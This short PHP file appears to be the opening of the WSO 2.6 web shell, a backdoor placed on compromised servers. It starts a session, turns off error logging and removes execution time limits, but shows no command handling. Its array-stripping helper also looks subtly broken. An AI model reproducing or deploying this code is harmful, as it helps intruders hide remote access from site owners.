<?php

function WSOstripslashes($array) { 
    return stripslashes($array); 
} 
	
@session_start(); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('WSO_VERSION', '2.6'); 
  
$_POST = WSOstripslashes($_POST); 
?>